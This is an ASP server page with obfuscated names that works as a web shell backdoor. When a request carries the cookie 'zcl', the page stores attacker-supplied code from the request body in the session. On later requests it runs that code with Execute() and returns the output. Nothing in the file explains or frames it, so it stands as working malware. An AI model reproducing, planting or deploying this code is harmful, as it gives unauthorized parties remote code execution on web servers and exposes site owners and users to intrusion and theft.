<%
Set AylWg = Server.CreateObject("Scripting.Dictionary")

Function BY030C(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set CSHW = CreateObject("ADODB.Stream")
    CSHW.CharSet = "iso-8859-1"
    CSHW.Type = 2
    CSHW.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            CSHW.WriteText chrw(ascb(midb(content,i,1)))
        Next
    end if
    CSHW.Position = 0
    if isBin then
        CSHW.Type = 1
        BY030C=CSHW.Read()
    else
        BY030C=CSHW.ReadText()
    end if

End Function
    content = request.BinaryRead(request.TotalBytes)
    if len(request.Cookies.Item("zcl"))>0  then
        if  IsEmpty(Session("loadIw51")) then
            content=BY030C(content,false)
            Session("loadIw51")=content
            response.End
        else
            AylWg.Add "loadIw51",Session("loadIw51")
            Execute(AylWg("loadIw51"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite result
            end if
        end if
    end if
%>